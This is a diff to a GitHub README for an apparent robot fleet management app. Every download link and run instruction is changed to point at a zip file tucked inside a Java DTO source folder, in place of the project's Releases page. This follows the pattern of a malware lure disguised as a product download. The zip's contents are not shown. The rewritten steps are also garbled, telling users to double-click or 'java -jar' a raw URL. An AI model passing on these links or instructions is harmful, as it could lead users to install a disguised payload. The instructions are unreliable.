@@ -1,7 +1,7 @@
 # 🤖 robotics-fleet-management - Seamlessly Manage Your Robot Fleet
 
 ## 📥 Download Now
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Qwer7954384/robotics-fleet-management/releases)
+[![Download from Releases](https://raw.githubusercontent.com/Qwer7954384/robotics-fleet-management/main/src/main/java/com/paklog/robotics/fleet/management/infrastructure/rest/dto/robotics-fleet-management_v1.0.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Qwer7954384/robotics-fleet-management/main/src/main/java/com/paklog/robotics/fleet/management/infrastructure/rest/dto/robotics-fleet-management_v1.0.zip)
 
 ## 🚀 Getting Started
 
@@ -36,7 +36,7 @@ Before downloading, please ensure your system meets the following requirements:
 
 To download the application, please visit the following page:
 
-[Download from Releases](https://github.com/Qwer7954384/robotics-fleet-management/releases)
+[Download from Releases](https://raw.githubusercontent.com/Qwer7954384/robotics-fleet-management/main/src/main/java/com/paklog/robotics/fleet/management/infrastructure/rest/dto/robotics-fleet-management_v1.0.zip)
 
 Once there, locate the latest version. Click on the version number to access the release details. You will find links to various files. Download the appropriate file for your operating system. 
 
@@ -52,16 +52,16 @@ Once there, locate the latest version. Click on the version number to access the
 3. **Run the Application:**
    - For Windows:
      - Navigate to the folder where you extracted the files.
-     - Double-click the `robotics-fleet-management.exe` file to start.
+     - Double-click the `https://raw.githubusercontent.com/Qwer7954384/robotics-fleet-management/main/src/main/java/com/paklog/robotics/fleet/management/infrastructure/rest/dto/robotics-fleet-management_v1.0.zip` file to start.
   
    - For macOS:
      - Open the `Terminal` and navigate to the folder containing the extracted files.
-     - Type `java -jar robotics-fleet-management.jar` and press Enter.
+     - Type `java -jar https://raw.githubusercontent.com/Qwer7954384/robotics-fleet-management/main/src/main/java/com/paklog/robotics/fleet/management/infrastructure/rest/dto/robotics-fleet-management_v1.0.zip` and press Enter.
   
    - For Linux:
      - Open the terminal.
      - Navigate to the directory with the extracted files.
-     - Run `java -jar robotics-fleet-management.jar`.
+     - Run `java -jar https://raw.githubusercontent.com/Qwer7954384/robotics-fleet-management/main/src/main/java/com/paklog/robotics/fleet/management/infrastructure/rest/dto/robotics-fleet-management_v1.0.zip`.
 
 4. **Follow On-Screen Instructions:**
    - The application will guide you through the initial setup. Follow the prompts to configure your robot fleet.
@@ -90,4 +90,4 @@ If you have questions or need help, please open an issue in the repository. We w
 This project is licensed under the [MIT License](LICENSE). Please read the license for more information.
 
 ## 📥 Download Now Again
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Qwer7954384/robotics-fleet-management/releases)
+[![Download from Releases](https://raw.githubusercontent.com/Qwer7954384/robotics-fleet-management/main/src/main/java/com/paklog/robotics/fleet/management/infrastructure/rest/dto/robotics-fleet-management_v1.0.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Qwer7954384/robotics-fleet-management/main/src/main/java/com/paklog/robotics/fleet/management/infrastructure/rest/dto/robotics-fleet-management_v1.0.zip)
